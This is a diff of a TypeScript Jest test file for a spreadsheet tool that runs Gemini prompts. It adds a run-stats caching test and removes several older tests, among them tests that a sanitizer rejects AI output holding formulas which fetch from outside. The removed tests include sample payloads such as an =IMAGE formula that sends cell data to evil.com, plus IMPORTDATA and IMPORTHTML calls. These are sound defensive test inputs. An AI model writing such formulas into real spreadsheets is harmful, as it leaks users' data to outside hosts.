@@ -15,14 +15,13 @@ import {
   truncateText,
   flattenArg,
   resolveColumns,
-  findOrCreateColumn,
-  writeColumn,
   writeJobProgress,
+  writeRunStats,
   interpolateTemplate,
-  sanitizeForCell,
   resolveGroundingUris,
 } from "../src/server/utils";
 import type { DriveFileInfo, GeminiResponse } from "../src/server/types";
+import type { RunStats } from "../src/shared/types";
 
 describe("extractId", () => {
   it("extracts ID from a standard Drive file URL", () => {
@@ -296,78 +295,6 @@ describe("resolveColumns", () => {
   });
 });
 
-// ── findOrCreateColumn ──────────────────────────────────────────
-
-describe("findOrCreateColumn", () => {
-  function makeSheet(headers: string[]): GoogleAppsScript.Spreadsheet.Sheet {
-    const values = [headers.slice()];
-    return {
-      getLastColumn: () => headers.length,
-      getRange: jest
-        .fn()
-        .mockImplementation((_row: number, _col: number, numRows?: number, numCols?: number) => {
-          if (numRows === 1 && numCols !== undefined) {
-            return { getValues: () => values };
-          }
-          return { setValue: jest.fn() };
-        }),
-    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
-  }
-
-  it("returns 1-based index of existing column", () => {
-    const sheet = makeSheet(["Drive Link", "System Prompt", "Output"]);
-    expect(findOrCreateColumn(sheet, "System Prompt")).toBe(2);
-  });
-
-  it("appends new column and returns its 1-based index when not found", () => {
-    const sheet = makeSheet(["Drive Link"]);
-    const setValueMock = jest.fn();
-    (sheet.getRange as jest.Mock).mockImplementation(
-      (_row: number, _col: number, numRows?: number, numCols?: number) => {
-        if (numRows === 1 && numCols !== undefined) {
-          return { getValues: () => [["Drive Link"]] };
-        }
-        return { setValue: setValueMock };
-      },
-    );
-    const idx = findOrCreateColumn(sheet, "New Col");
-    expect(idx).toBe(2);
-    expect(setValueMock).toHaveBeenCalledWith("New Col");
-  });
-
-  it("appends to column 1 when sheet is empty", () => {
-    const setValueMock = jest.fn();
-    const sheet = {
-      getLastColumn: () => 0,
-      getRange: jest.fn().mockReturnValue({ setValue: setValueMock }),
-    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
-    const idx = findOrCreateColumn(sheet, "My Col");
-    expect(idx).toBe(1);
-    expect(setValueMock).toHaveBeenCalledWith("My Col");
-  });
-
-  it("applies wrapStrategy to the new column range when provided", () => {
-    const setValueMock = jest.fn();
-    const setWrapStrategyMock = jest.fn();
-    const sheet = {
-      getLastColumn: () => 0,
-      getMaxRows: () => 100,
-      getRange: jest
-        .fn()
-        .mockImplementation((_row: number, _col: number, numRows?: number) =>
-          numRows !== undefined
-            ? { setWrapStrategy: setWrapStrategyMock }
-            : { setValue: setValueMock },
-        ),
-    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
-    const wrapStrategy = "CLIP" as unknown as GoogleAppsScript.Spreadsheet.WrapStrategy;
-    findOrCreateColumn(sheet, "My Col", wrapStrategy);
-    expect(setWrapStrategyMock).toHaveBeenCalledWith(wrapStrategy);
-  });
-});
-
-// ── writeColumn ─────────────────────────────────────────────────
-
 describe("writeJobProgress", () => {
   it("writes serialized progress to cache with 5-minute TTL", () => {
     const mockPut = jest.fn();
@@ -400,36 +327,31 @@ describe("writeJobProgress", () => {
   });
 });
 
-describe("writeColumn", () => {
-  it("writes values starting at row 2 using a single setValues call", () => {
-    const setValuesMock = jest.fn();
-    const sheet = {
-      getRange: jest.fn().mockReturnValue({ setValues: setValuesMock }),
-    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
-    writeColumn(sheet, 3, ["a", "b", "c"]);
-    expect(sheet.getRange).toHaveBeenCalledWith(2, 3, 3, 1);
-    expect(setValuesMock).toHaveBeenCalledWith([["a"], ["b"], ["c"]]);
-  });
+describe("writeRunStats", () => {
+  it("writes serialized stats to cache keyed by spreadsheet ID with a 6-hour TTL", () => {
+    const mockPut = jest.fn();
+    const mockCache = { put: mockPut } as unknown as GoogleAppsScript.Cache.Cache;
+    const stats: RunStats = {
+      rowCount: 10,
+      totalTimeMs: 4200,
+      totalInputTokens: 500,
+      totalOutputTokens: 300,
+      totalTokenCost: 0.002,
+      totalGroundingQueries: 0,
+      totalGroundingCost: 0,
+      testedAt: 1234567890,
+      config: {
+        promptCols: [{ col: "col_a", kind: "text" }],
+        systemPromptCol: undefined,
+        tools: [],
+        prefixWithColName: false,
+        model: "gemini-3.1-flash-lite",
+      },
+    };
 
-  it("does nothing when values array is empty", () => {
-    const sheet = {
-      getRange: jest.fn(),
-    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
-    writeColumn(sheet, 1, []);
-    expect(sheet.getRange).not.toHaveBeenCalled();
-  });
+    writeRunStats(mockCache, "sheet-abc", stats);
 
-  it("applies wrapStrategy to the written range when provided", () => {
-    const setValuesMock = jest.fn();
-    const setWrapStrategyMock = jest.fn();
-    const sheet = {
-      getRange: jest
-        .fn()
-        .mockReturnValue({ setValues: setValuesMock, setWrapStrategy: setWrapStrategyMock }),
-    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
-    const wrapStrategy = "CLIP" as unknown as GoogleAppsScript.Spreadsheet.WrapStrategy;
-    writeColumn(sheet, 3, ["a", "b"], wrapStrategy);
-    expect(setWrapStrategyMock).toHaveBeenCalledWith(wrapStrategy);
+    expect(mockPut).toHaveBeenCalledWith("runStats:sheet-abc", JSON.stringify(stats), 21600);
   });
 });
 
@@ -498,81 +420,6 @@ describe("interpolateTemplate", () => {
     );
 
     expect(interpolateTemplate("{{#x}}first{{/x}}{{#x}}second{{/x}}", { x: "" })).toBe("");
-  });
-});
-
-describe("sanitizeForCell", () => {
-  const REJECTION_MSG =
-    "[SSI Error: AI response contained an external request formula — output rejected]";
-
-  // Web-fetch blocking — these functions make outbound HTTP requests and can exfiltrate cell data
-  it("rejects =IMAGE formula (exfiltrates cell data via image URL)", () => {
-    expect(sanitizeForCell('=IMAGE("https://evil.com/?d="&A1)')).toBe(REJECTION_MSG);
-  });
-
-  it("rejects +IMPORTDATA formula (fetches external URL via + prefix)", () => {
-    expect(sanitizeForCell("+IMPORTDATA(A1)")).toBe(REJECTION_MSG);
-  });
-
-  it("rejects -IMPORTXML formula", () => {
-    expect(sanitizeForCell('-IMPORTXML(A1, "//b")')).toBe(REJECTION_MSG);
-  });
-
-  it("rejects =IMPORTHTML formula", () => {
-    expect(sanitizeForCell('=IMPORTHTML("http://evil.com", "table", 1)')).toBe(REJECTION_MSG);
-  });
-
-  it("rejects =IMPORTRANGE formula", () => {
-    expect(sanitizeForCell('=IMPORTRANGE("spreadsheetId", "A1:A10")')).toBe(REJECTION_MSG);
-  });
-
-  it("rejects =IMPORTFEED formula", () => {
-    expect(sanitizeForCell('=IMPORTFEED("http://evil.com/rss")')).toBe(REJECTION_MSG);
-  });
-
-  it("rejects web-fetch function nested inside another formula", () => {
-    expect(sanitizeForCell('=IF(1=1,IMAGE("evil.com"),0)')).toBe(REJECTION_MSG);
-  });
-
-  it("rejects web-fetch function nested inside IFERROR", () => {
-    expect(sanitizeForCell('=IFERROR(IMPORTDATA("http://evil.com"),0)')).toBe(REJECTION_MSG);
-  });
-
-  it("rejects web-fetch function name regardless of case", () => {
-    expect(sanitizeForCell('=image("evil.com")')).toBe(REJECTION_MSG);
-  });
-
-  // Safe formula prefix — non-web-fetch formulas get ' to prevent Sheets from evaluating them
-  it("prepends apostrophe to non-web-fetch formula starting with =", () => {
-    expect(sanitizeForCell("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
-  });
-
-  it("prepends apostrophe to non-web-fetch formula starting with - (defense-in-depth)", () => {
-    expect(sanitizeForCell("-SUM(A1:A10)")).toBe("'-SUM(A1:A10)");
-  });
-
-  it("prepends apostrophe to non-web-fetch formula starting with +", () => {
-    expect(sanitizeForCell("+SUM(A1:A10)")).toBe("'+SUM(A1:A10)");
-  });
-
-  // Unchanged
-  it("leaves normal AI response text unchanged", () => {
-    expect(sanitizeForCell("The subject appeared in three court filings.")).toBe(
-      "The subject appeared in three court filings.",
-    );
-  });
-
-  it("leaves empty string unchanged", () => {
-    expect(sanitizeForCell("")).toBe("");
-  });
-
-  it("leaves values with leading whitespace unchanged (Sheets does not evaluate as formula)", () => {
-    expect(sanitizeForCell("  =not evaluated as formula")).toBe("  =not evaluated as formula");
-  });
-
-  it("preserves the full response when prepending apostrophe to a safe multiline formula", () => {
-    const input = "=SUM(A1:A10)\nNote: this formula sums the range";
-    expect(sanitizeForCell(input)).toBe(`'${input}`);
   });
 });
 
